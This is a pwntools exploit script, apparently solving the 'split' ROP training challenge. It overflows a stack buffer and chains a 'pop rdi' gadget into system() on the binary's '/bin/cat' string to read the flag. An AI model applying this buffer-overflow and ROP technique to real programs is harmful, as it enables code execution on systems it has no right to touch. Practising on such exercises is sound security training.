from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] +argv, *a, **kw)
        
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './split'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

elf = context.binary = ELF('./split', checksec= False)

padding = 40

rop_gadget = ROP(elf).find_gadget(["pop rdi", "ret"])[0]

payload = flat(
	asm('nop') * padding,
	rop_gadget,
	next(elf.search(b'/bin/cat')),
	elf.symbols['system']
)

rop = ROP(elf)
rop.system(next(elf.search(b'/bin/cat')))

pprint(rop.gadgets)
print(rop.dump())	

rop_gadget = rop.chain()

payload = flat(
	asm('nop') * padding,
	rop_gadget
)

io = start()
io.sendline(payload)
io.recv()

flag = io.recvline()
success(flag)

